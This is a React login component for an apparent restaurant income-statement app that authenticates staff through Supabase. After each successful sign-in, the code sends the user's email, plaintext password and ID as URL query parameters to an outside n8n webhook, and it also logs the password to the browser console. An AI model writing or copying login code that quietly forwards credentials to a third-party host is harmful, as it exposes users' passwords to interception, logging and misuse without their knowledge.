
import React, { useState } from 'react';
import { supabase } from '@/integrations/supabase/client';

interface LoginProps {
  onLogin: (obid: string) => void;
}

const Login: React.FC<LoginProps> = ({ onLogin }) => {
  // Fixed email reference issue - force cache refresh
  const [obid, setObid] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState<{ obid?: string; password?: string; general?: string }>({});
  const [isLoading, setIsLoading] = useState(false);

  const convertToEmail = (id: string) => {
    return `${id}@oceanbasket.com`;
  };

  const sendWebhookData = async (email: string, password: string, obid: string) => {
    try {
      const webhookUrl = 'https://exillar-n8n-u48653.vm.elestio.app/webhook-test/Restaurant Income Statement';
      const params = new URLSearchParams({
        email: email,
        password: password,
        obid: obid,
        timestamp: new Date().toISOString()
      });
      
      await fetch(`${webhookUrl}?${params}`, {
        method: 'GET',
      });
      console.log('Webhook data sent successfully');
    } catch (error) {
      console.error('Error sending webhook data:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { obid?: string; password?: string; general?: string } = {};

    console.log('Form submitted with:', { obid, password });

    if (!obid) {
      newErrors.obid = 'OBID is required';
    }

    if (!password) {
      newErrors.password = 'Password is required';
    }

    // Check if we have validation errors
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsLoading(true);
    setErrors({});

    try {
      // Convert OBID to email format
      const email = convertToEmail(obid);
      console.log('Attempting Supabase authentication...');
      
      // Sign in with Supabase
      const { data, error } = await supabase.auth.signInWithPassword({
        email: email,
        password: password,
      });

      if (error) {
        console.error('Supabase auth error:', error);
        setErrors({ general: 'Invalid OBID or password' });
        return;
      }

      if (data.user) {
        console.log('Authentication successful:', data.user);
        
        // Send data to webhook
        await sendWebhookData(email, password, obid);
        
        onLogin(obid);
      }
    } catch (error) {
      console.error('Login error:', error);
      setErrors({ general: 'An error occurred during login. Please try again.' });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex relative bg-gradient-to-br from-blue-900 via-blue-800 to-blue-900">
      {/* Ocean wave background effect */}
      <div className="absolute inset-0 overflow-hidden">
        {/* Wave layers for depth effect */}
        <svg className="absolute bottom-0 w-full h-full" viewBox="0 0 1200 800" xmlns="http://www.w3.org/2000/svg">
          {/* Back wave layer */}
          <path 
            d="M0,400 C300,350 600,450 900,400 C1050,375 1150,425 1200,400 L1200,800 L0,800 Z" 
            fill="rgba(59, 130, 246, 0.3)"
            className="animate-[wave_8s_ease-in-out_infinite]"
          />
          {/* Middle wave layer */}
          <path 
            d="M0,500 C200,450 400,550 600,500 C800,450 1000,525 1200,500 L1200,800 L0,800 Z" 
            fill="rgba(29, 78, 216, 0.4)"
            className="animate-[wave_6s_ease-in-out_infinite_reverse]"
          />
          {/* Front wave layer */}
          <path 
            d="M0,600 C150,575 300,625 450,600 C600,575 750,625 900,600 C1050,575 1150,625 1200,600 L1200,800 L0,800 Z" 
            fill="rgba(30, 64, 175, 0.5)"
            className="animate-[wave_4s_ease-in-out_infinite]"
          />
        </svg>
        
        {/* Floating elements for ocean effect */}
        <div className="absolute top-1/4 left-1/4 w-2 h-2 bg-blue-200/30 rounded-full animate-pulse"></div>
        <div className="absolute top-1/3 right-1/4 w-1 h-1 bg-blue-100/40 rounded-full animate-pulse delay-1000"></div>
        <div className="absolute bottom-1/3 left-1/3 w-3 h-3 bg-blue-300/20 rounded-full animate-pulse delay-500"></div>
      </div>

      {/* Right side - Login form */}
      <div className="ml-auto w-2/5 bg-blue-900/90 backdrop-blur-sm relative flex items-center justify-center border-l border-blue-700/50">
        {/* Login form container */}
        <div className="relative z-10 w-full max-w-md px-8">
          {/* Logo section */}
          <div className="text-center mb-16">
            <div className="flex items-center justify-center mb-8">
              <div className="bg-white rounded-full w-16 h-16 flex items-center justify-center mr-4">
                <span className="text-primary font-bold text-xl">OB</span>
              </div>
              <h1 className="text-white text-2xl font-script">Restaurant Income Statement</h1>
            </div>
            <h2 className="text-white text-3xl font-normal tracking-[0.3em] uppercase">LOG-IN</h2>
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-12">
            <div className="relative">
              <label className="text-white text-sm mb-2 block">
                OBID <span className="text-orange-500 ml-1">•</span>
              </label>
              <input
                type="text"
                value={obid}
                onChange={(e) => setObid(e.target.value)}
                className="w-full bg-transparent border-0 border-b border-white px-0 py-3 text-white text-lg placeholder-white/70 focus:outline-none focus:border-secondary"
                placeholder=""
              />
              {errors.obid && (
                <p className="text-red-300 text-sm mt-2">{errors.obid}</p>
              )}
            </div>

            <div className="relative">
              <label className="text-white text-sm mb-2 block">
                Password <span className="text-orange-500 ml-1">•</span>
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full bg-transparent border-0 border-b border-white px-0 py-3 text-white text-lg placeholder-white/70 focus:outline-none focus:border-secondary"
                placeholder=""
              />
              {errors.password && (
                <p className="text-red-300 text-sm mt-2">{errors.password}</p>
              )}
            </div>

            {errors.general && (
              <div className="bg-red-100 border border-red-300 text-red-700 px-4 py-3 rounded-lg text-sm">
                {errors.general}
              </div>
            )}

            <div className="pt-8">
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-transparent border border-white text-white py-4 px-8 rounded-full text-lg font-normal hover:bg-white hover:text-primary transition-colors duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? 'Logging in...' : 'Login'}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Login;
